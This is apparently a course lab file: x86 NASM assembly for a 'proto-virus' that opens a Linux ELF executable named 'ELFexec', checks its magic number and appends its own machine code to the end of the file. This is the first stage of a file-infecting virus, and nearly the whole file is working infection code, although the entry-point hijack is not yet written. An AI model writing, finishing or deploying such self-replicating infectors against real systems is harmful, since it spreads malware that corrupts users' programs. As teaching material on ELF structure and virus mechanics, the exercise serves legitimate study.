%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
%define off_fd		4
%define off_size	8
%define off_magnum	12

%define magsize 4
%define magnum	0x464c457f ; = '.ELF' in little indian
%define STDOUT 1
%define STDERR 2

%define FILE_OPEN_ERROR	0xfffffffe ; = 2's complement for -1
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	; your lab code goes here
	write STDOUT, OutStr, OutStr_length
	
	open FileName, RDWR, 0
	cmp eax, dword FILE_OPEN_ERROR
	jne .fileOK
	; error
	write STDERR, Failstr, Failstr_length
	exit 1
	.fileOK:
	; backup fd
	mov [ebp-off_fd], dword eax
	
	; read magic number
	mov eax, ebp
	sub eax, off_magnum ; eax now equals to ebp-off_magnum, which is where the magic number is going to be read into
	read [ebp-off_fd], eax, magsize ; read magic number into [ebp-off_magnum]
	
	; check magic number
	cmp [ebp-off_magnum], dword magnum
	je .isElfFile
	exit 2
	.isElfFile:
	; move to the end of the file
	lseek [ebp-off_fd], 0, SEEK_END
	
	; backup size
	mov [ebp-off_size], eax
	
	write [ebp-off_fd], _start, virus_end-_start
	
VirusExit:
	close [ebp-off_fd]
	exit 0            ; Termination if all is OK and no previous code to jump to
			  ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
FileName_length:equ $ - FileName
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStr_length:	equ $ - OutStr
Failstr:        db "perhaps not", 10 , 0
Failstr_length:	equ $ - Failstr

PreviousEntryPoint: dd VirusExit
virus_end:


